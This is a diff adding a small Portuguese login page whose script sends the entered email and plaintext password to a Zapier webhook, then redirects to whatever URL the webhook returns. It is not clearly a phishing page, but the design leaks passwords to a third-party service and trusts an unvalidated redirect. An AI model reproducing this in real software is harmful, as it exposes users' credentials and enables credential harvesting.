@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+  <head>
+    <meta charset="UTF-8">
+    <title>Login Dinâmico</title>
+    <style>
+      body { font-family: Arial, sans-serif; margin: 2em; }
+      .mensagem { margin-top: 1em; color: red; }
+    </style>
+  </head>
+  <body>
+    <h1>Faça o Login</h1>
+    <form id="loginForm">
+      <label>Email: <input type="email" name="email" required></label><br><br>
+      <label>Senha: <input type="password" name="senha" required></label><br><br>
+      <button type="submit">Entrar</button>
+    </form>
+    <div id="feedback" class="mensagem"></div>
+    
+    <script>
+      document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const formData = new FormData(this);
+        const email = formData.get('email');
+        const senha = formData.get('senha');
+
+        // Substitua pela URL do seu webhook do Zapier
+        const zapierWebhookURL = 'https://hooks.zapier.com/hooks/catch/18290484/2cu4kbz/';
+
+        fetch(zapierWebhookURL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({ email, senha })
+        })
+        .then(response => response.json())
+        .then(data => {
+          // Redirecionamento automático com base na resposta do webhook
+          window.location.href = data.url;
+        })
+        .catch(err => {
+          document.getElementById('feedback').textContent = 'Erro na conexão. Tente novamente.';
+        });
+      });
+    </script>
+  </body>
+</html>
